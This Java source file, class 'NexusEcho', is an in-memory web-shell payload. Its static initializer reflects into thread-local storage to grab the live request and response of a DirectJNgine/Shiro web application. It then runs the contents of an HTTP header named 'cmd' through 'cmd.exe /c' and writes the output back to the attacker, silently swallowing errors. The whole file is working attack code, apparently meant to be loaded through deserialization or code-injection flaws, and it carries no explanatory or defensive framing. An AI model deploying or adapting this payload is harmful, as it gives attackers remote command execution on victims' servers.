package NexusEcho;

public class NexusEcho {
    static {
        try {
            Thread thread = Thread.currentThread();
            java.lang.reflect.Field threadLocals = Thread.class.getDeclaredField("threadLocals");
            threadLocals.setAccessible(true);
            Object threadLocalMap = threadLocals.get(thread);
            Class threadLocalMapClazz = Class.forName("java.lang.ThreadLocal$ThreadLocalMap");
            java.lang.reflect.Field tableField = threadLocalMapClazz.getDeclaredField("table");
            tableField.setAccessible(true);
            Object[] objects = (Object[]) tableField.get(threadLocalMap);
            Class entryClass = Class.forName("java.lang.ThreadLocal$ThreadLocalMap$Entry");
            java.lang.reflect.Field entryValueField = entryClass.getDeclaredField("value");
            entryValueField.setAccessible(true);
            for (Object object : objects) {
                if (object != null) {
                    Object valueObject = entryValueField.get(object);
                    if (valueObject != null) {
                        if (valueObject.getClass().getName().equals("com.softwarementors.extjs.djn.servlet.ssm.WebContext")) {
                            java.lang.reflect.Field response = valueObject.getClass().getDeclaredField("response");
                            response.setAccessible(true);
                            Object shiroServletResponse = response.get(valueObject);
                            Class<?> Wrapper = shiroServletResponse.getClass().getSuperclass().getSuperclass();
                            Object statusResponse = Wrapper.getMethod("getResponse").invoke(shiroServletResponse);
                            Object response1 = Wrapper.getMethod("getResponse").invoke(statusResponse);
                            java.io.PrintWriter writer = (java.io.PrintWriter) response1.getClass().getMethod("getWriter").invoke(response1);

                            java.lang.reflect.Field request = valueObject.getClass().getDeclaredField("request");
                            request.setAccessible(true);
                            Object shiroServletRequest = request.get(valueObject);
                            Class<?> Wrapper2 = shiroServletRequest.getClass().getSuperclass().getSuperclass();
                            Object statusResponse2 = Wrapper2.getMethod("getRequest").invoke(shiroServletRequest);
                            Object request1 = Wrapper2.getMethod("getRequest").invoke(statusResponse2);
                            Object request1Real = Wrapper2.getMethod("getRequest").invoke(request1);
                            String[] cmds = {"cmd.exe","/c" , (String)request1Real.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(request1Real, new Object[]{"cmd"})};

                            String sb = "";
                            java.io.BufferedInputStream in = new java.io.BufferedInputStream(Runtime.getRuntime().exec(cmds).getInputStream());
                            java.io.BufferedReader inBr = new java.io.BufferedReader(new java.io.InputStreamReader(in));
                            String lineStr;
                            while ((lineStr = inBr.readLine()) != null)
                                sb += lineStr + "\n";
                            writer.write(sb);
                            writer.flush();
                            inBr.close();
                            in.close();
                        }
                    }
                }
            }

        } catch (Exception e) {
        }
    }
}